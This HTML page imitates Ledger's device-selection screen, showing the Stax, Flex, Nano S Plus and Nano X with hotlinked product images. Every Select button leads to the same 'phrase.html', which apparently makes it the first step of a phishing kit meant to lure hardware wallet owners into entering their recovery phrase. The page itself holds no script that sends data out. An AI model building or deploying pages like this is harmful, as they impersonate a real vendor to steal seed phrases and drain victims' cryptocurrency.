<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Select Your Device - Ledger</title>
  <style>
    body {
      background-color: #0f0e0f;
      color: #fff;
      font-family: "IBM Plex Mono", monospace;
      text-align: center;
      margin: 0;
      padding: 0;
    }

    .back {
      position: absolute;
      top: 20px;
      left: 30px;
      color: #aaa;
      text-decoration: none;
      font-size: 14px;
    }

    .back:hover {
      color: #fff;
    }

    h1 {
      margin-top: 80px;
      font-size: 18px;
      letter-spacing: 4px;
      font-weight: 500;
    }

    h2 {
      margin-top: 40px;
      font-size: 28px;
      font-weight: 600;
      letter-spacing: 3px;
      text-transform: uppercase;
    }

    .devices {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 60px;
      margin-top: 80px;
    }

    .device-card {
      background-color: transparent;
      border-radius: 14px;
      padding: 20px;
      width: 220px;
      display: flex;
      flex-direction: column;
      align-items: center;
      transition: transform 0.3s ease;
    }

    .device-card:hover {
      transform: translateY(-8px);
    }

    .device-card img {
      width: 120px;
      height: auto;
      margin-bottom: 25px;
      object-fit: contain;
      filter: brightness(1.4) contrast(1.2) drop-shadow(0 0 5px rgba(255,255,255,0.1));
      transition: transform 0.3s ease;
    }

    .device-card:hover img {
      transform: scale(1.05);
    }

    .device-card h3 {
      margin-bottom: 15px;
      font-size: 17px;
    }

    button {
      background-color: #fff;
      color: #000;
      border: none;
      padding: 10px 25px;
      border-radius: 25px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #d0cbff;
    }
  </style>
</head>
<body>
  <a href="#" class="back">‚Üê Previous</a>

  <h1>[ LEDGER ]</h1>
  <h2>SELECT YOUR DEVICE</h2>

  <div class="devices">
    <div class="device-card">
      <img src="https://cdn.jsdelivr.net/gh/ledgerHQ/ledger-live-assets/public/nanoX/light.png" alt="Ledger Stax" />
      <h3>Ledger Stax</h3>
      <button onclick="window.location.href='phrase.html'">Select</button>
    </div>

    <div class="device-card">
      <img src="https://cdn.jsdelivr.net/gh/ledgerHQ/ledger-live-assets/public/flex/light.png" alt="Ledger Flex" />
      <h3>Ledger Flex</h3>
      <button onclick="window.location.href='phrase.html'">Select</button>
    </div>

    <div class="device-card">
      <img src="https://cdn.jsdelivr.net/gh/ledgerHQ/ledger-live-assets/public/nanoS/light.png" alt="Ledger Nano S Plus" />
      <h3>Ledger Nano S & Plus</h3>
      <button onclick="window.location.href='phrase.html'">Select</button>
    </div>

    <div class="device-card">
      <img src="https://cdn.jsdelivr.net/gh/ledgerHQ/ledger-live-assets/public/nanoX/light.png" alt="Ledger Nano X" />
      <h3>Ledger Nano X</h3>
      <button onclick="window.location.href='phrase.html'">Select</button>
    </div>
  </div>
</body>
</html>
